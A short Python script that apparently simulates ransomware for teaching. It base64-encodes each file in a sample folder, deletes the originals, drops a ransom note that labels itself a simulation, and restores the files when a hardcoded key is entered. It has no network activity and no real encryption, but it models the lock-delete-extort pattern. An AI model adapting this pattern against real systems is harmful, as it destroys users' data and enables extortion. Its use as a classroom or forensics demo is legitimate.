import os
import base64

KEY = "FORENSIC123"   # Recovery key (simulation)

FOLDER = "sample_files"

def encrypt_files():
    for file in os.listdir(FOLDER):
        path = os.path.join(FOLDER, file)

        if file.endswith(".locked"):
            continue

        with open(path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data)

        with open(path + ".locked", "wb") as f:
            f.write(encoded)

        os.remove(path)

    create_ransom_note()
    print("🔒 Files encrypted (SIMULATION)")

def decrypt_files(user_key):
    if user_key != KEY:
        print("❌ Wrong key! Files remain locked.")
        return

    for file in os.listdir(FOLDER):
        if file.endswith(".locked"):
            path = os.path.join(FOLDER, file)

            with open(path, "rb") as f:
                data = f.read()

            decoded = base64.b64decode(data)

            new_name = path.replace(".locked", "")
            with open(new_name, "wb") as f:
                f.write(decoded)

            os.remove(path)

    print("✅ Files successfully recovered!")

def create_ransom_note():
    note = """
    ⚠️ YOUR FILES ARE LOCKED ⚠️

    This is a SIMULATION of ransomware.

    To recover your files, enter the correct key.
    No payment required.

    This demo is for educational purposes only.
    """
    with open("ransom_note.txt", "w") as f:
        f.write(note)

def main():
    print("1. Encrypt Files")
    print("2. Recover Files")
    choice = input("Enter choice: ")

    if choice == "1":
        encrypt_files()
    elif choice == "2":
        key = input("Enter recovery key: ")
        decrypt_files(key)
    else:
        print("Invalid choice")

main()

